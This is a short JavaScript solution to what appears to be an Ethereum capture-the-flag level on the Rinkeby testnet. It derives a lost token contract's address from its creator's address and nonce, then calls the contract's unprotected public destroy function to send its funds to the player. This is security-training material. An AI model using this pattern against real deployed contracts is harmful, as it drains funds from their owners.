
const tokenAddr = "0xc4b8e21ec6e75d427f54a0eb31f4593158d73f75";

// a contract address created using create (not create2) is
// based on the keccak256 hash of the address that created it
// concatenated with a nonce, the number of transactions sent
// by it starting from 0, if it's a wallet address, or the
// number of contracts created by it starting from 1 (since EIP 161),
// if it's a contract address.
// we can use a python script (https://ethereum.stackexchange.com/a/63235)
// to calculate it:
//
// >> mk_contract_address("0xee1457373EBCEF43F11D2F96B3452935D13bdefC", 1)
// '0xC4b8e21ec6e75D427f54a0EB31F4593158D73F75'
//
// we can also search for the instance address at the rinkeby testnet
// etherscan (https://rinkeby.etherscan.io/address/0xee1457373EBCEF43F11D2F96B3452935D13bdefC#internaltx).
// there, we can see that a token contract was created at
// 0xC4b8e21ec6e75D427f54a0EB31F4593158D73F75.
//
// since anyone can call the destroy function and get the funds,
// we can write down the abi specs for it, create a Contract
// instance with the address, and then call it.

const Exploit = new web3.eth.Contract([
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "_to",
                "type": "address"
            }
        ],
        "name": "destroy",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
], tokenAddr);

await Exploit.methods.destroy(player).send({ from: player });
